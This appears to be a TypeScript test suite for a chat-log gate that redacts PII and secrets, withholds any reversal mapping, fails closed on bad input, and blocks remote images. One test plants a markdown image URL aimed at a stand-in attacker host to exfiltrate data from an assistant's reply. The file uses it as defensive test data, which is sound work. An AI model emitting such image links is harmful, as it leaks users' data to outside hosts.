import { test } from 'node:test'
import assert from 'node:assert/strict'
import { gateOpenChat } from './open-chat-gate.js'

test('gate masks structured PII/secrets before indexing', () => {
  const r = gateOpenChat([
    { role: 'user', content: 'email me at jane.doe@acme.com or call 415-555-0199' },
    { role: 'assistant', content: 'your key is sk-ABCDEFGHIJKLMNOPqrstuvwx and SSN 123-45-6789' },
  ])
  assert.equal(r.ok, true)
  // no raw PII survives into the indexable text
  assert.ok(!r.redacted.includes('jane.doe@acme.com'), 'email leaked')
  assert.ok(!r.redacted.includes('415-555-0199'), 'phone leaked')
  assert.ok(!r.redacted.includes('sk-ABCDEFGHIJKLMNOPqrstuvwx'), 'api key leaked')
  assert.ok(!r.redacted.includes('123-45-6789'), 'ssn leaked')
  // and it's masked with placeholders
  assert.ok(/\[EMAIL_\d+\]/.test(r.redacted), 'no email placeholder')
  assert.ok(/\[APIKEY_\d+\]/.test(r.redacted), 'no apikey placeholder')
  assert.ok(r.findings.piiCount >= 4, `expected >=4 findings, got ${r.findings.piiCount}`)
  assert.ok(r.findings.pii['EMAIL']! >= 1 && r.findings.pii['SSN']! >= 1)
})

test('gate NEVER returns a placeholder->value mapping (commons cannot un-redact)', () => {
  const r = gateOpenChat([{ role: 'user', content: 'ssn 123-45-6789' }]) as unknown as Record<string, unknown>
  // the GateResult shape has no mapping field at all
  assert.equal('mapping' in r, false, 'gate exposed a reversal mapping')
})

test('gate neutralises the remote-image exfil channel and reports the url', () => {
  const r = gateOpenChat([
    { role: 'assistant', content: 'here ![leak](https://attacker.example/collect?data=supersecretpayload)' },
  ])
  assert.equal(r.ok, true)
  assert.ok(!r.redacted.includes('attacker.example'), 'exfil image url survived into index')
  assert.ok(r.redacted.includes('[remote image blocked]'), 'image not neutralised')
  assert.ok(r.findings.exfilUrls.some((u) => u.includes('attacker.example')), 'exfil url not reported')
})

test('clean chat passes through unchanged with zero findings', () => {
  const r = gateOpenChat([
    { role: 'user', content: 'what is the capital of France?' },
    { role: 'assistant', content: 'Paris.' },
  ])
  assert.equal(r.ok, true)
  assert.equal(r.findings.piiCount, 0)
  assert.equal(r.findings.exfilUrls.length, 0)
  assert.ok(r.redacted.includes('capital of France') && r.redacted.includes('Paris'))
})

test('gate fails CLOSED on bad input (never waves a chat through)', () => {
  // messages contains a message whose content getter throws → gate must return ok:false, empty redacted
  const hostile = [{ role: 'user', get content(): string { throw new Error('boom') } }] as unknown as Parameters<typeof gateOpenChat>[0]
  const r = gateOpenChat(hostile)
  assert.equal(r.ok, false)
  assert.equal(r.redacted, '')
  assert.ok(r.error)
})
